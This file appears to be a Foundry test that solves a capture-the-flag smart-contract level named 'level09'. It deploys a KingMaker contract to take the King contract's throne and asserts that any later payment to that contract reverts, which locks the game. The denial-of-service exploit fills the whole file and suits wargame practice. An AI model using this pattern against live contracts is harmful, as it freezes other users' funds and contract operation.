// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel09.sol";
import "../src/level09.sol";

contract Attacker is Test {
    King level09 = King(payable(0x3d8A1317A91B2b9f53A108E00dA27aa2DacD7d90));

    function test() external {
        uint256 prize = level09.prize();

        vm.deal(address(this), 2 * prize);
        KingMaker kingMaker = (new KingMaker){value: prize}();

        assertEq(level09._king(), address(kingMaker));

        vm.expectRevert("EvmError: Revert");
        (bool success,) = address(level09).call{value: prize}("");

        assert(!success);
        assertEq(level09._king(), address(kingMaker));
    }
}
